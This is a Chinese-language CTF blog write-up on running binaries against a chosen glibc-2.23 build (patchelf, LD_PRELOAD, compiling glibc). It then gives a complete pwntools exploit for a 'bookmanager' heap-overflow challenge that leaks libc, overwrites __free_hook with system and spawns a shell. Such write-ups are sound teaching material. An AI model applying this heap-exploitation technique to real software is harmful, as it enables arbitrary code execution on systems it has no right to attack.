---
title: "写在前面"
date: 2019-08-26T23:35:49+08:00
tags: [""]
categories: ["工具使用接口", "CTF-WriteUp"]
---


第一次比赛一个堆溢出题目快要做出来了，却因为环境配置问题（一直无法用给定版本的 `libc.so` 运行程序）。最后不得不再源码编译 `glibc-2.23`（坑太多了，系统被搞崩了一次），心态爆炸。

## 指定版本的 `libc` 运行程序

总结一下到底应该如何使用一个给定的 `glibc` 库文件运行指定的可执行文件：

1. 第一步则是需要拿到指定的 `ld.so` 文件（用于链接 `libc.so` 与可执行文件的程序），将目标文件的链接程序地址指向本地的 `ld.so` 文件。

   这一步网上有 [python 脚本](<https://bbs.pediy.com/thread-225849.htm>)，但是使用 [`patchelf` 这个命令](<https://www.jianshu.com/p/3b219df2b2bd>)更快。

2. 第二步是设置 `LD_PRELOAD` 环境变量。

比如说，这个程序需要运行 `libc-2.23.so`，我们就需要执行以下的两条命令：

```bash
$ patchelf --set-interpreter /usr/local/glibc-2.23/lib/ld-2.23.so bookmanager

$ export LD_PRELOAD=/usr/local/glibc-2.23/lib/libc-2.23.so
```

如果我们已经将可执行文件中，链接程序的地址设置好了，我们也可以再 `pwntools` 中这么运行：

```python
from pwn import *
p = process(["./bookmanager"], env={"LD_PRELOAD": "/usr/local/glibc-2.23/lib/libc-2.23.so"})
```

## 编译指定版本的 `libc`

但是上面我文件中的 `ld.so` 文件，题目是没有给的，于是我们就需要通过源码编译的方式得到这个文件。

- 网上应该会有直接的资源下载，但是我太菜了，没有找到，只找到了[源码的国内镜像](<http://mirrors.nju.edu.cn/gnu/libc/>)

如果没有遇到任何问题，下面几条命令应该是一个完整的编译流程：

```bash
$ wget http://mirrors.nju.edu.cn/gnu/libc/glibc-2.23.tar.bz2

$ tar -xf glibc-2.23.tar.bz2

$ mkdir ./glibc-2.23/glibc-build && cd ./glibc-2.23/glibc-build

$ ../configure --prefix=/usr/local/glibc-2.23 --disable-werror 

$ make && make install
```

但是，使用高版本的 `gcc`、`g++` 交叉编译低版本的 `glibc` 会出现很多 `bug`：

1. 源码层面的出现很多 `bug` 在网上找到了一个[解决方案](https://blog.wh98.me/2019/03/20/编译glibc遇到的问题/)；

2. `cc1` 会将 `warning` 当作 `error`，需要在运行 `configure` 命令时加入 `--disable-werror`。

# book manager

程序流程，漏洞发现什么的都不说了，这个题很简单，直接上 `exp.py`：

```python
#!/usr/bin/env python3
from pwn import *


class Challenge:
    def __init__(self, local):
        self.local = local
        if local:
            self.p = process(["./bookmanager"], env={"LD_PRELOAD": "/usr/local/glibc-2.23/lib/libc-2.23.so"})
        else:
            self.p = remote("47.112.115.30", 13337)
        self.libc = ELF("/usr/local/glibc-2.23/lib/libc-2.23.so")
        self.section_ptr, self.book, self.libc_base = {}, {}, 0

    def gdb(self, script):
        assert self.local
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(proc.pidof(self.p)[0], gdbscript=script)

    def set_bookname(self, book_name):
        self.p.sendlineafter("Name of the book you want to create: ", book_name)
        self.p.recvuntil("Your choice:")

    def add_chapter(self, chapter_name):
        self.p.sendline("1")
        self.p.sendlineafter("Chapter name:", chapter_name)
        self.p.recvuntil("Your choice:")

    def add_section(self, chapter_name, section_name):
        self.p.sendline("2")
        self.p.sendlineafter("Which chapter do you want to add into:", chapter_name)
        self.section_ptr[section_name] = int(self.p.recvline().lstrip("0x"), 16)
        self.p.sendlineafter("Section name:", section_name)
        self.p.recvuntil("Your choice:")

    def add_text(self, section_name, text_length, text):
        assert text_length <= 256
        self.p.sendline("3")
        self.p.sendlineafter("Which section do you want to add into:", section_name)
        self.p.sendlineafter("How many chapters you want to write:", str(text_length))
        self.p.sendlineafter("Text:", text)
        self.p.recvuntil("Your choice:")

    def remove_chapter(self, chapter_name):
        self.p.sendline("4")
        self.p.sendlineafter("Chapter name:", chapter_name)
        self.p.recvuntil("Your choice:")

    def remove_section(self, section_name):
        self.p.sendline("5")
        self.p.sendlineafter("Section name:", section_name)
        self.p.recvuntil("Your choice:")

    def remove_text(self, section_name):
        self.p.sendline("6")
        self.p.sendlineafter("Section name:", section_name)
        self.p.recvuntil("Your choice:")

    def book_preview(self):
        self.p.sendline("7")
        recved = self.p.recvuntil("\n=========================="). \
            rstrip("\n==========================").lstrip("\nBook:")
        book_name, chapters = recved.split("\n  Chapter:")[0], recved.split("\n  Chapter:")[1:]
        self.book = {book_name: {}}
        for cind, chapter in enumerate(chapters):
            chapter_name, sections = chapter.split("\n    Section:")[0], chapter.split("\n    Section:")[1:]
            self.book[book_name][chapter_name] = {}
            for sind, section in enumerate(sections):
                section_name, text = section.split("\n      Text:")[0], section.split("\n      Text:")[1]
                self.book[book_name][chapter_name][section_name] = text
        self.p.recvuntil("Your choice:")

    def update(self, choice, old, new):
        assert choice in ["Chapter", "Section", "Text"]
        self.p.sendline("8")
        self.p.sendlineafter("What to update?(Chapter/Section/Text):", choice)
        self.p.sendlineafter(":", old)
        self.p.sendlineafter(":", new)
        assert self.p.recvuntil("Your choice:").strip().startswith("Updated")

    def pwn(self):
        # todo: initialization
        self.set_bookname("PWN_BOOK")
        self.add_chapter("chapter_one")
        self.add_section("chapter_one", "section_one")
        self.add_text("section_one", 0x100 - 0x10 - 0x30, "text_one")
        self.add_section("chapter_one", "section_two")

        # todo: leak heap to get arbitrarily write&read
        self.update("Text", "section_one", flat([
            "A" * 0xc8, 0x41, "section_two".ljust(0x28, "\x00"), 0x20
        ], word_size=64))

        def write_to(address, content):
            payload = flat([
                "A" * 0xc8, 0x41, "section_two".ljust(0x20, "\x00"), address
            ], word_size=64)
            assert len(payload) < 0xff and len(content) < 0xff
            self.update("Text", "section_one", payload)
            self.update("Text", "section_two", content)

        def read_from(address):
            payload = flat([
                "A" * 0xc8, 0x41, "section_two".ljust(0x20, "\x00"), address
            ], word_size=64)
            assert len(payload) < 0xff
            self.update("Text", "section_one", payload)
            self.book_preview()
            text = self.book["PWN_BOOK"]["chapter_one"]["section_two"]
            return u64(text.ljust(8, "\x00")[:8])

        # todo: leak libc address from unsorted bin
        self.add_section("chapter_one", "section_three")
        self.add_text("section_three", 0x100, "BIGTEXT")
        self.add_chapter("chapter_two")     # prevent heap-top
        self.remove_text("section_three")
        unsorted_bin_addr = read_from(self.section_ptr["section_three"] + 0x30 + 0x10)
        self.libc_base = unsorted_bin_addr - 0x19eb78
        print "leak libc_base: %x" % self.libc_base

        # todo: overwrite __free_hook & execute system("/bin/sh")
        free_hook_addr = self.libc.symbols["__free_hook"] + self.libc_base
        system_addr = self.libc.symbols["system"] + self.libc_base
        write_to(free_hook_addr, p64(system_addr))
        self.add_chapter("/bin/sh")
        self.remove_chapter("/bin/sh")
        self.p.interactive()


if __name__ == "__main__":
    c = Challenge(True)
    c.pwn()
```


